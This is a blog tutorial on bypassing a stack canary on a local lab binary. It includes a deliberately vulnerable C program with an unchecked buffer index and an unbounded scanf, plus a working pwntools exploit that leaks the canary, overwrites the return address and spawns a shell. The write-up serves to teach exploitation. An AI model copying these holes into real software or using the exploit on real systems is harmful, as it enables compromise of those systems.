In my last post I discussed the outline of a very straightforward and basic Buffer Overflow vulnerability. The vulnerable program that I created was compiled with DEP protection, ASLR protection and without a canary. 

Today I am going build on what I learned last time by adding a stack canary. First, we are going to address what is a Stack Canary?

Much like the idea of the canary in the coalmine the stack canary is meant to be a detection mechanism against "bad". Conceptually a value is placed on the stack. The program will check to see if the value has been modified or overwritten in any way. If it has then the program will exit with a fault.

Let's take our original example from the Buffer Overflow post. If we compile it without the canary disabled and run the program we get the following error in Figure 1:

<img width="800" height="75" alt="image" src="https://github.com/user-attachments/assets/14aa4de9-54fe-41f6-bf17-25b1e349331c" />

To prove this with the working solution we can again prove that it also triggers the stack smashing detection, as seen in Figure 2.

<img width="800" height="112" alt="image" src="https://github.com/user-attachments/assets/1cea7567-29a2-4aeb-ba26-a73cef0b47cf" />

We can open up the program in `gdb` to see how the stack canary is referenced in the program and on the stack.
- We can use the command `checksec` to display all of the security features enabled for this program. Fortunately, checksec also tells us what the value of the canary is. This is depicted in Figure 3.
- This can be confirmed by stepping into the `get_data()` function. The operation mov `rax, QWORD PTR fs:0x28` is the command that moves the canary from the fs register at offset `0x28` into the `rax register`, as shown in Figure 4.
- The `fs:0x28` register is a default location for the program to store the canary value.
- We can confirm this value by referencing the `rax` register in Figure 5. Which we can see contains the same value that was previously displayed with the `checksec` command.

<img width="800" height="64" alt="image" src="https://github.com/user-attachments/assets/ea4f1e90-5c5c-4364-8ba6-31c874339cb0" />

<img width="800" height="116" alt="image" src="https://github.com/user-attachments/assets/87acc628-4285-411a-9f5c-d4e316d97c5b" />

<img width="800" height="48" alt="image" src="https://github.com/user-attachments/assets/8074a773-1c44-4d2f-9f7a-60e6a6e0d809" />

Figure 3Figure 4Figure 5The next instruction moves the value in `rax` (the canary) onto the stack. Now if this value is overwritten on the stack the stack smashing error occurs.
- The value is placed right above the base pointer on the stack. The order would go:
- buffer -> stack canary -> base pointer (rbp) -> return address

<img width="800" height="138" alt="image" src="https://github.com/user-attachments/assets/ec3e0087-f4d4-4d4c-9353-679dc6c7071c" />

**The Vulnerability**

If we were to run this program additional times we would notice that the stack canary (cookie) changes every time. This makes it very difficult (not always impossible) to simply guess the value of that canary. However, there are three techniques to bypass the use of a Stack Canary.

1.)Leak the canary
- The stack canary can be leaked if the program contains any arbitrary read vulnerability. This effectively would allow us to gain access to that value and then simple add it to our exploit.
- A vulnerability that might expose this bypass would include: Uncontrolled format strings, out-of-bounds array access, uninitialized memory usage, or type confusion.
2.) Target other variables instead
- Bruteforce the canary

**The Program**

The following is an example vulnerable program that I will be using to illustrate how to bypass a stack canary.
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

// Add a jmp rsp gadget using inline assembly
void gadget_function() {
    __asm__(
        ".global jmp_rsp_gadget\n"
        "jmp_rsp_gadget:\n"
        "    jmp *%rsp\n"
    );
}

// Add the ability to accept an integer input for the main() function and 
// program functionality
int get_int() {
 int i;
 scanf("%d", &i);
 while (getchar() != '\n');
 return i;
}
// The main() function that allows a user to enter and read arbitrary data into
// a buffer. 
int main() {
  // Define the choice variable as an integer
  int choice;
  // Define buff as five 16 byte arrays. This will allow for the user to add
  // info into one the arrays at a time and read from them.
  char buff[5][16];
  // Set a loop that remains persistent until we break out of it.
    while(1) {
  // Create a prompt to Enter or View Data or Exit the function.
    printf("Please select an option\n");
    printf("(1) Enter Data, (2) View Data, (3) Exit the Function\n");
  // Store the return value from the get_int() function into the choice variable.
    choice = get_int();
  // Choose which case to enter into based on the return value from get_int().
    switch(choice){
      // Case 1 allows us to enter random data for the buffer overflow condition.
      // We can pick the buffer that we want to write to and then we can enter
      // the arbitrary data. Again %s allows us to enter any amount of data to
      // the buffer with no restrictions.
      case 1:
        printf("Please enter a buffer number (0-4):\n");
        int buffer_num = get_int();
        if (buffer_num < 0 || buffer_num > 4) {
         printf("Invalid buffer number.\n");
         return 0;
        }   
        printf("Please enter arbitrary data here:\n");
        scanf("%s", buff[buffer_num]);
        break;
      // Case 2 allows us to read data from a buffer defined above. However, in
      // this case there are no bounds checks. This means that we can read data
      // outside of the buff[] varaible and leak the canary.
      // fwrite prints the output of the buffer for the location we specify.
      case 2:
        printf("Please enter a buffer number (0-4):\n");
        int buffer_nu = get_int();
        printf("This is what you wrote:")
        fwrite(buff[buffer_nu], 1, 16, stdout);
        printf("\n");
        break;
      // Exit the program. We need to be able to exit the program to be trigger
      // the return address overwrite and control the program.
      case 3:
       return 0;
      // If we don't select a valid value from the switch.
      default:
        printf("Please select a correct option\n");
   }
  }
}
```

The following was used to compile the program to ensure that stack canaries (cookies) are enabled.
```
gcc -o bo_canary_mod bo_canary_mod.c -no-pie -zexecstack
```
To recap from my previous post:
- no-pie disables ASLR
- zexecstack enables execution from the stack or disables DEP.

This is done so we can only focus on bypassing a stack canary.
Figure 7 shows the program does have a canary enabled for the newly compiled program.

<img width="800" height="144" alt="image" src="https://github.com/user-attachments/assets/1bf83cfd-a5f4-4e46-95cf-19bbca6feeff" />

Figure 8 depicts the canary working with the Stack Smashing error.

<img width="800" height="119" alt="image" src="https://github.com/user-attachments/assets/98cf69df-8ee2-43fe-ad3c-acf1fc25fbb8" />

**The Exploit**

Below is the working exploit that bypasses the stack canary. I will walk through how each portion of this was calculated and found.
```
from pwn import *

p = process("./bo_canary_mod")
# p = gdb.debug("./bo_canary_mod")

# Setting the architecture to x64 for program we will be interacting with
context.arch = "x86_64"

# Use pwn tools builtin shellcraft utility to craft shellcode to give us a sh shell. The shellcode is for a AMD64 Linux system and asm is assembling the shellcode into bytes. This output is being saved into the ShellCode variable to be used later.
ShellCode = asm(shellcraft.amd64.linux.sh())

# Leak the canary value from the stack by choosing an out of bounds array.
p.sendline(str(2))  # View data
p.recvuntil("Please enter a buffer number (0-4):\n")
p.sendline(str(5))  # Try buffer 5
p.recvuntil("This is what you wrote:")  # Read the output from the program, but do not save this output.

# Read exactly 16 bytes (16 bytes of buffer 5)and print that back for debugging.
raw_data = p.recv(16)
print("Raw data received:", raw_data.hex())

# The canary is in the last 8 bytes of buffer 5
# Note: x86_64 is little-endian, so we need to reverse the bytes
# We're getting 16 bytes total, but we want the last 8 bytes
# which contain the canary

canary = raw_data[8:]  # Get the last 8 bytes
# Again print the canary value for debugging.
print("Canary bytes:", canary.hex())
print("Canary value:", hex(u64(canary)))

# Now overwrite the buffer at position 0.
p.sendline(str(1))
p.recvuntil("Please enter a buffer number (0-4):\n")
p.sendline(str(0))
p.recvuntil("Please enter arbitrary data here:\n")
# The offset to the canary is 88 bytes. Then we write the canary. There are 8 bytes of buffer after the canary. Finally our return address is overwritten with the address of a jmp rsp command and finally the shellcode to be executed.
p.sendline(b"A"*88 + canary + b"A"*8 + p64(0x4011fe) + ShellCode)

# Now we need to exit the main loop to trigger the return from main
# The main loop is infinite, so we need to force it to exit
p.sendline(str(3)) 

# Now we should have control of the return address
p.interactive()
```

Figure 9 shows the exploit executing properly with a shell.

<img width="800" height="277" alt="image" src="https://github.com/user-attachments/assets/836ccf23-0acc-4957-907f-94bcb09d67f4" />

**Leaking the Canary**

I am going to skip over the first section of this program because it is just the standard shellcode that will be leveraged for execution on the stack. It is the same tactic that was used on my previous post.

To understand the following section of code we are going to again use our friend gdb to determine where the the stack canary actually lives in relation to the array.
```
# Leak the canary value from the stack by choosing an out of bounds array.
p.sendline(str(2))  # View data
p.recvuntil("Please enter a buffer number (0-4):\n")
p.sendline(str(5))  # Try buffer 5
p.recvuntil("This is what you wrote:")  # Read the output from the program, but do not save this output.

# Read exactly 16 bytes (16 bytes of buffer 5)and print that back for debugging.
raw_data = p.recv(16)
print("Raw data received:", raw_data.hex())

# The canary is in the last 8 bytes of buffer 5
# Note: x86_64 is little-endian, so we need to reverse the bytes
# We're getting 16 bytes total, but we want the last 8 bytes
# which contain the canary

canary = raw_data[8:]  # Get the last 8 bytes
# Again print the canary value for debugging.
print("Canary bytes:", canary.hex())
print("Canary value:", hex(u64(canary)))
```

So how did I decide that viewing buffer 5 would allow for us to leak the canary? We can determine this by using GDB. First, it is important to understand that this is only possible because of the memory leak vulnerability in the code. We are able to read data from outside of the buff[] array because there are no checks to ensure that we are attempting to print data located in the array that we defined in our program.

Once we run the program using `gdb` we can disassemble main to determine a break point. The breakpoint I set is where the `main()` function calls `get_int()`.

Once we enter "run" we are brought to the the breakpoint and notice that we do not see the entirety of the stack (Figure 10)


<img width="800" height="131" alt="image" src="https://github.com/user-attachments/assets/6c7f2bd6-5c16-4c1d-8cf8-420fd4259aca" />

This is because by default `gd`b only shows a small portion of the stack, however, we can change this using the following command (Figure 11).
```
gef config context.nb_lines_stack 32
```

<img width="800" height="254" alt="image" src="https://github.com/user-attachments/assets/7498b2ba-7e5c-44e6-83b1-5e278f7fe1b2" />

This is much better and allows us to see the entire stack frame for the `main()` function. We can verify by seeing the point to rbp and the stack canary value directly above that with the value of `0xf5b1c153dd6f2500`.
To prove that buffer 5 contains that stack canary we can first enter data into buffer location 4 (Figure 12) and print out the values of both 4, 5, and 6.

<img width="800" height="245" alt="image" src="https://github.com/user-attachments/assets/4942d18a-8ac6-49a1-9bcd-608e598c3d26" />

The 16 A's that I entered into location 4 are placed into offset `0x0050`, while the canary is at `0x0068`. Each buffer is 16 bytes, meaning that buffer 4 is allocated memory at offsets `0x0050` and `0x0058`. Therefore, buffer 5 contains data at offsets `0x0060` and `0x0068`. So, the canary is located in the last 8 bytes of buffer 5, which is technically out of bounds of the defined array.

When I use case 2 to print out the value associated with buffer 4 I can see the listing of A's (Figure 13).

<img width="800" height="195" alt="image" src="https://github.com/user-attachments/assets/34938321-5f7b-4f85-bb21-8b4f68cc8a89" />

When I do the same thing with buffer 5 the `fwrite()` prints out the value `0x0000000000000000`, which is the value associated with the address `0x00007fffffffe000` (Figure 14). This leads us to believe that buffer 5 might contain the canary.

<img width="800" height="371" alt="image" src="https://github.com/user-attachments/assets/1993b886-3c71-4f08-a1cc-b810eea51580" />

Finally, we can prove this by printing out the value associated with buffer 6. This is `0x0000000000000000` which is located at `0x00007fffffffdf50` as shown in Figure 15. This confirms that the canary is located in buffer 5.

<img width="800" height="398" alt="image" src="https://github.com/user-attachments/assets/fbc28f4b-6ace-4454-8fba-54c43af6bdcc" />

Armed with this knowledge we can parse the output of the fwrite() function and grab the last 8 bytes that are printed in the buffer. We can save that value into a variable called canary that will be leveraged in sending the payload.

**Sending the Exploit**

Once we have the canary, we are almost ready to send the exploit. The following is the section of code that interacts with the program to send the payload to obtain the shell.
```
# Now overwrite the buffer at position 0.
p.sendline(str(1))
p.recvuntil("Please enter a buffer number (0-4):\n")
p.sendline(str(0))
p.recvuntil("Please enter arbitrary data here:\n")
# The offset to the canary is 88 bytes. Then we write the canary. There are 8 bytes of buffer after the canary. Finally our return address is overwritten with the address of a jmp rsp command and finally the shellcode to be executed.
p.sendline(b"A"*88 + canary + b"A"*8 + p64(0x4011fe) + ShellCode)
```

The first couple of lines are relatively straight forward. The first line allows us to enter the case that handles arbitrary data. The second line defines the buffer position that we want to write to. Technically, I did not need to choose 0, I could have chosen 0–4, and this exploit would have worked. However, the original offset of A's would change depending on the value chosen.

In order to understand the offset or the number of A's that need to be entered prior to the canary, we can use a tool in `gdb` called `pattern create` (Figure 16).

<img width="800" height="85" alt="image" src="https://github.com/user-attachments/assets/db64d376-5c62-4ef3-a984-25ff3556a9ee" />

I can enter this unique string into my program to determine where the location of the offset to the location in memory that I care about. I will continue my program execution until I can enter arbitrary data into buffer[0] and observe the stack (Figure 17).

<img width="800" height="410" alt="image" src="https://github.com/user-attachments/assets/c1a3592c-4482-4297-8e07-d57eaf1d80ca" />

We know from previous observation that the stack canary was located at offset `0x0068` from `rsp` . The value stored within that memory location is `laaaaaaamaaaaaaanaaa`. Armed with this information we can use the tool `pattern search` to determine the offset of this value from the beginning of our data (Figure 18).

<img width="800" height="172" alt="image" src="https://github.com/user-attachments/assets/d0c10e00-d77b-466d-8184-4c5a729c5d67" />

Doing this illustrates that the canary is located 88 bytes into our input. Therefore, we can enter any 88 bytes of arbitrary data into the input and the exploit will still work. However, once we hit 88 bytes we need to add the stack canary. This is because when the main() exits that stack canary will be checked against the stored value and if they do not match the program will error out.

After the stack canary there is the value of `rbp` which occurs directly before the return value of the function. What this means is that an additional 8 bytes of arbitrary data needs to be enter between the canary and the return address for this exploit to work. Finally, a location of the jmp rsp instruction and shell code are placed onto the stack as we did in our previous blog post.

The final payload again is just
```
p.sendline(b"A"*88 + canary + b"A"*8 + p64(0x4011fe) + ShellCode)
```

**Exiting Main() and Getting a Shell**

The final portion of this exploit is the following:
```
# Now we need to exit the main loop to trigger the return from main
# The main loop is infinite, so we need to force it to exit
p.sendline(str(3)) 

# Now we should have control of the return address
p.interactive()
```

In order for the program to hit the return address that points to the `jmp rsp` instruction we need to exit our `switch/ while` statement. That is done by using the 3rd case, which exits the program for us. Once complete the main() stack frame is deconstructed and the new return point is hit, jumping back onto the stack and executing the shellcode (Figure 19)


<img width="800" height="277" alt="image" src="https://github.com/user-attachments/assets/364998a8-cf64-4fe1-a5f3-42bd936dff24" />

If there are any questions please let me know and I will be happy to update this article. I look forward to seeing you all in my dive into DEP!
